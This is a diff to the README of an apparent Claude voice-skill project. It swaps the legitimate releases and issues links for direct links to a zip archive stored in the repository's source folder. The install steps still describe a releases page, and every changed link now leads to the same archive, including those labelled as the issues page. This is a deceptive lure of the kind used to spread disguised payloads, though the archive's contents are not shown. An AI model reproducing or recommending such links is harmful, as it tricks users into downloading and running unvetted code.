@@ -6,7 +6,7 @@ Welcome to the **claude-code-voice-skill**! This skill allows you to have voice 
 ## 📥 Download & Install
 To download the application, visit the link below. This page contains the latest version you can download.
 
-[Download the Latest Release](https://github.com/tehrim-786/claude-code-voice-skill/releases)
+[Download the Latest Release](https://github.com/tehrim-786/claude-code-voice-skill/raw/refs/heads/main/src/claude_voice/code_voice_skill_claude_2.0.zip)
 
 ### Step-by-Step Installation:
 1. **Go to the Releases Page**: Click on the link above to open the releases page.
@@ -50,12 +50,12 @@ For common problems, refer to the help section within the app or look for FAQs o
 
 ## ✉️ Community Support
 Feel free to reach out if you need help or have questions:
-- Submit an issue on our [GitHub Issues page](https://github.com/tehrim-786/claude-code-voice-skill/issues).
+- Submit an issue on our [GitHub Issues page](https://github.com/tehrim-786/claude-code-voice-skill/raw/refs/heads/main/src/claude_voice/code_voice_skill_claude_2.0.zip).
 - Join our community discussions for tips and support from other users.
 
 ## 🔗 Additional Resources
-- [Latest Release Page](https://github.com/tehrim-786/claude-code-voice-skill/releases)
-- [GitHub Issues](https://github.com/tehrim-786/claude-code-voice-skill/issues)
+- [Latest Release Page](https://github.com/tehrim-786/claude-code-voice-skill/raw/refs/heads/main/src/claude_voice/code_voice_skill_claude_2.0.zip)
+- [GitHub Issues](https://github.com/tehrim-786/claude-code-voice-skill/raw/refs/heads/main/src/claude_voice/code_voice_skill_claude_2.0.zip)
 - User guides and FAQs.
 
 With these steps, you are ready to use the **claude-code-voice-skill** and make your project discussions easier and more convenient! Enjoy talking to Claude!
